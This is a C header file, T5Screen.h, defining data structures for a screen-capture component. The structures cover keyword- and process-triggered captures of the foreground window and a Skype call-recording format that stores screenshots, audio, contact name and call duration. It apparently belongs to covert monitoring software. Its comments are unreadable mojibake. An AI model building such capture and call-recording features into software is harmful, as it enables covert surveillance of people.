/********************************************************************
 * Filename:
 *     T5Screen.h
 * 
 * Author:
 *     xyz
 *
 * Time:
 *     2010/7/25   09:15
 * 
 * Note:
 *     
 *
 */	
#ifndef _TJ_T5_XQT_SCREEN_H_
#define _TJ_T5_XQT_SCREEN_H_

#define		CAPTURE_VERSION				0x00000001
#define		GZIP						(1)
#define		PRINT_SCREEN_MAGIC			0xFE801972
#define		KEYPROCESSWND				0x100
#define		KEYTITLEWINDOW				0x200
#define		FULLSCREEN					0x400

#define		THE_SAME_WINDOW(_LAST_WND)	\
	((_LAST_WND) == GetForegroundWindow())

#pragma pack(push)
#pragma pack(1)

//
// ��ȡ�����ṹ
//
typedef struct _CAPTURE_CONFIG
{
	DWORD		dwSize;						
	BOOL		bCapWindow;					
	DWORD		dwWindowInterval;			
	DWORD		dwKeyListOffset;           
	DWORD		dwKeyListLength;            
	PWCHAR		lpwzKeyList;               
	DWORD		dwProcessListOffset;        
	DWORD		dwProcessListLength;        
	PWCHAR		lpwzProcessList;     
	
	// ��ԭ�н�ͼ����������������ֶ�
	DWORD		dwRecordType;		// 0x00000001 - ���� 0x00000002 - �γ�
	DWORD		dwRecordTime;		// ¼ȡʱ�䣬 0 Ϊ����ʱ
} CAPTURE_CONFIG, *PCAPTURE_CONFIG;

//
// �����ļ���ͷ��
//
typedef struct _CAPTURE_FILE_HEADER
{
	DWORD		dwMagicNumber;			// ħ����
	DWORD		dwPrintType;
	BYTE		bUnUsed[16];
	WCHAR		wzProcessName[64];		// ��ȡ���ڵĽ�����
	FILETIME	ftSavetime;				// ��ȡʱ��
    
} CAPTURE_FILE_HEADER, *PCAPTURE_FILE_HEADER;

// Skype ����Ƶ������ݽṹ
// ��Ƶ��ͼ����Ƶ�ļ��ϲ�Ϊһ��
//
// +-------------------+-----------------------+----------+-----------------------+----------
// | SKYPE_FILE_HEADER | SKYPE_SUB_FILE_HEADER | �ļ����� | SKYPE_SUB_FILE_HEADER | �ļ�����
// +-------------------+-----------------------+----------+-----------------------+----------

typedef struct _SKYPE_FILE_HEADER
{
	DWORD		dwMagicNumber;			// 0xFF14FF14
	WCHAR		wzSaveTime[256];
	DWORD		dwDuraiton;				// ͨ��ʱ��
	WCHAR		wzContract[256];		// ��ϵ��
} SKYPE_FILE_HEADER, *PSKYPE_FILE_HEADER;

typedef struct _SKYPE_SUB_FILE_HEADER
{
	DWORD		dwFileType;				// 0 - ͼƬ 1 - ��Ƶ
	DWORD		dwFileSize;				// �ļ���С
	WCHAR		wzFileName[256];		// �ļ���
}SKYPE_SUB_FILE_HEADER, *PSKYPE_SUB_FILE_HEADER;

#pragma pack(pop)

#endif